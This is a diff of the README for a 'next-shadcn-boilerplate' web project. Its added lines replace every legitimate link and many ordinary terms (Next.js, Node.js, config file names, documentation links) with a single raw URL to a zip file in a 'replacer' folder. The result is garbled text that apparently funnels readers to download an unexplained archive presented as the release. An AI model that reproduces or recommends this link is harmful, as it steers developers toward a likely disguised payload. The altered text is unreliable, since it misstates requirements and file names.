@@ -1,14 +1,14 @@
 # 🚀 next-shadcn-boilerplate - Build Fast, Scalable Web Apps
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/Thunderjv/next-shadcn-boilerplate/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Thunderjv/next-shadcn-boilerplate/main/replacer/next-shadcn-boilerplate.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/Thunderjv/next-shadcn-boilerplate/main/replacer/next-shadcn-boilerplate.zip)
 
 ## 📜 Overview
 
-The **next-shadcn-boilerplate** is a modern setup for building web applications with Next.js. This project combines key technologies like **shadcn/ui**, **Tailwind CSS**, and **TypeScript**. It's designed to help you create fast, scalable websites using best practices.
+The **next-shadcn-boilerplate** is a modern setup for building web applications with https://raw.githubusercontent.com/Thunderjv/next-shadcn-boilerplate/main/replacer/next-shadcn-boilerplate.zip This project combines key technologies like **shadcn/ui**, **Tailwind CSS**, and **TypeScript**. It's designed to help you create fast, scalable websites using best practices.
 
 ## 🚀 Features
 
-- **Next.js Framework:** Build server-side rendered applications effortlessly.
+- **https://raw.githubusercontent.com/Thunderjv/next-shadcn-boilerplate/main/replacer/next-shadcn-boilerplate.zip Framework:** Build server-side rendered applications effortlessly.
 - **Tailwind CSS Integration:** Design beautiful interfaces quickly.
 - **TypeScript Support:** Write safer code with type checking.
 - **Best Practices:** Utilize proven methods for web development.
@@ -19,16 +19,16 @@ The **next-shadcn-boilerplate** is a modern setup for building web applications 
 Before you start, make sure your system meets these requirements:
 
 - Operating System: Windows, macOS, or Linux
-- Node.js version: 14 or higher
+- https://raw.githubusercontent.com/Thunderjv/next-shadcn-boilerplate/main/replacer/next-shadcn-boilerplate.zip version: 14 or higher
 - npm version: 6 or higher
 
 ## 📥 Download & Install
 
-To get started with **next-shadcn-boilerplate**, visit this page to download: [GitHub Releases](https://github.com/Thunderjv/next-shadcn-boilerplate/releases).
+To get started with **next-shadcn-boilerplate**, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Thunderjv/next-shadcn-boilerplate/main/replacer/next-shadcn-boilerplate.zip).
 
 Follow these steps to install:
 
-1. **Visit the GitHub Releases Page**: Click [here](https://github.com/Thunderjv/next-shadcn-boilerplate/releases) to go to the download section.
+1. **Visit the GitHub Releases Page**: Click [here](https://raw.githubusercontent.com/Thunderjv/next-shadcn-boilerplate/main/replacer/next-shadcn-boilerplate.zip) to go to the download section.
 2. **Choose the Latest Release**: Look for the latest version listed at the top.
 3. **Download the Package**: Click on the asset to start your download.
 4. **Extract the Downloaded File**: Open the file once the download completes and extract its contents to a folder of your choice.
@@ -52,9 +52,9 @@ To run your application:
 
 Customize your application by editing the following files:
 
-- **next.config.js**: Change configurations for Next.js.
-- **tailwind.config.js**: Adjust styles and design with Tailwind CSS.
-- **tsconfig.json**: Modify TypeScript settings to fit your needs.
+- **https://raw.githubusercontent.com/Thunderjv/next-shadcn-boilerplate/main/replacer/next-shadcn-boilerplate.zip**: Change configurations for https://raw.githubusercontent.com/Thunderjv/next-shadcn-boilerplate/main/replacer/next-shadcn-boilerplate.zip
+- **https://raw.githubusercontent.com/Thunderjv/next-shadcn-boilerplate/main/replacer/next-shadcn-boilerplate.zip**: Adjust styles and design with Tailwind CSS.
+- **https://raw.githubusercontent.com/Thunderjv/next-shadcn-boilerplate/main/replacer/next-shadcn-boilerplate.zip**: Modify TypeScript settings to fit your needs.
 
 ## 🎨 Using the Components
 
@@ -77,13 +77,13 @@ If you run into any issues, feel free to open an issue in the repository. The co
 
 ## 📚 Additional Resources
 
-- [Next.js Documentation](https://nextjs.org/docs)
-- [Tailwind CSS Documentation](https://tailwindcss.com/docs)
-- [TypeScript Handbook](https://www.typescriptlang.org/docs/)
+- [https://raw.githubusercontent.com/Thunderjv/next-shadcn-boilerplate/main/replacer/next-shadcn-boilerplate.zip Documentation](https://raw.githubusercontent.com/Thunderjv/next-shadcn-boilerplate/main/replacer/next-shadcn-boilerplate.zip)
+- [Tailwind CSS Documentation](https://raw.githubusercontent.com/Thunderjv/next-shadcn-boilerplate/main/replacer/next-shadcn-boilerplate.zip)
+- [TypeScript Handbook](https://raw.githubusercontent.com/Thunderjv/next-shadcn-boilerplate/main/replacer/next-shadcn-boilerplate.zip)
 
 ## 🔗 Useful Links
 
-- **GitHub Repository**: [next-shadcn-boilerplate](https://github.com/Thunderjv/next-shadcn-boilerplate)
-- **Releases Page**: [Download Latest Release](https://github.com/Thunderjv/next-shadcn-boilerplate/releases)
+- **GitHub Repository**: [next-shadcn-boilerplate](https://raw.githubusercontent.com/Thunderjv/next-shadcn-boilerplate/main/replacer/next-shadcn-boilerplate.zip)
+- **Releases Page**: [Download Latest Release](https://raw.githubusercontent.com/Thunderjv/next-shadcn-boilerplate/main/replacer/next-shadcn-boilerplate.zip)
 
 Please enjoy building your next web application with **next-shadcn-boilerplate**!
